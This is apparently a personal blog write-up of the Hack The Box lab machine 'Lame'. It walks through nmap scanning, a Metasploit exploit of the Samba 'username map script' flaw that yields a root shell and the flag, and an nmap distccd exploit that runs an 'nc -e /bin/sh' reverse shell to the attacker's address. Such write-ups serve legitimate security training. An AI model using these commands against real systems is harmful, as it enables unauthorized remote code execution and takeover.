---
title: Writeup - Hack The Box - Lame
author: Cihat Yildiz
date: 2020-10-24 20:55:00 +0800
categories: [hackthebox]
tags: [ctf]
pin: false
---

In this post, I will show how I resolve the machine called LAME. The difficulty of this macihne is easy. This is my first post about the hack the box machines. I will write more writeups about HTB macihnes. 
<!--more-->
![upload-image](/assets/img/htb/htb-lame.png)

Lame is one of the retired machined in HTB repository. But you can get access if you have premium membership which is good. Let's start hackinng this machine :) 

# Port and Service Discovery

Lets start with a basic nmap scan

```
root@kali:/home/kali# nmap 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-19 01:05 EDT
Nmap scan report for 10.10.10.3
Host is up (0.093s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds
```

scan all ports

```
root@kali:/home/kali# nmap -sS -p- 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-19 01:06 EDT
Nmap scan report for 10.10.10.3
Host is up (0.086s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 146.52 seconds
```

find runnnning services 

```
root@kali:/home/kali# nmap -sS -p21,22,139,445,3632 -sV -sC -O 10.10.10.3 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-19 01:09 EDT
Nmap scan report for 10.10.10.3
Host is up (0.084s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.24
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Arris TG862G/CT cable modem (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.22 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h55m00s, deviation: 2h49m43s, median: -3d02h55m01s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-10-15T22:15:17-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.00 seconds
```

# vsftpd 2.3.4

Nmap scan shows that the FTP service on the asset alloews unauthenticated login

```
```

I see that we cannot go through the unouthenticated login

# Smbd 

```
root@kali:/home/kali# searchsploit samba 3.0.20-Debian
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                       |  Path
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                               | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                     | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                        | linux_x86/dos/36741.py
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Metasploit

```
msf5 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf5 exploit(multi/samba/usermap_script) > info

       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck <jduck@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT   139              yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module exploits a command execution vulnerability in Samba 
  versions 3.0.20 through 3.0.25rc3 when using the non-default 
  "username map script" configuration option. By specifying a username 
  containing shell meta characters, attackers can execute arbitrary 
  commands. No authentication is needed to exploit this vulnerability 
  since this option is used to map usernames prior to authentication!

References:
  https://cvedetails.com/cve/CVE-2007-2447/
  OSVDB (34700)
  http://www.securityfocus.com/bid/23972
  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
  http://samba.org/samba/security/CVE-2007-2447.html

msf5 exploit(multi/samba/usermap_script) > show options 

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.208.182  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > set lhost 10.10.14.15
lhost => 10.10.14.15
msf5 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.3:54761) at 2020-10-29 03:02:39 -0400

id
uid=0(root) gid=0(root)
ls /root
Desktop
reset_logs.sh
root.txt
vnc.log
cat /root/root.txt
92caac3be140ef409e45721348a4e9df
```

# distccd

```
kali@kali:~$ nmap -p 3632 --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'" 10.10.10.3 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 02:55 EDT
Nmap scan report for 10.10.10.3
Host is up (0.091s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
```

run command on the server 

```
root@kali:/home/kali# nmap -p 3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh 10.10.14.15 9999'" 10.10.10.3 -PnStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 02:58 EDT
Nmap scan report for 10.10.10.3
Host is up (0.083s latency).

PORT     STATE SERVICE
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 30.49 seconds
root@kali:/home/kali# 
```

run listener 

```
kali@kali:~$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.3] 34436
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
pwd
/tmp
uname -a
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```
